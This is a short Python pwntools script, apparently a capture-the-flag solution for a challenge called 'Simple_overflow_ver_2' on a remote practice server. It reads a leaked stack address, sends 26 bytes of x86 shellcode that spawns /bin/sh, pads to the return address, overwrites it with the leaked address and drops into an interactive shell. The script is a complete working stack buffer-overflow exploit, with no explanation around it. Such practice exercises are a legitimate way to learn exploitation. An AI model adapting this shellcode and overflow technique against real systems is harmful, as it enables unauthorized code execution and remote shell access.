from pwn import *
  
p = remote('ctf.j0n9hyun.xyz', 3006)
# p = process('Simple_overflow_ver_2')

p.recvuntil('Data : ')
p.sendline('1')

s_addr = int(p.recv(10)[0:],16)
shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80" # 26byte

p.recvuntil('Again (y/n): ')
p.sendline('y')

payload = shellcode
payload += b"A" * (0x88 - len(shellcode) + 0x4)
payload += p32(s_addr)

p.sendline(payload)

p.interactive()
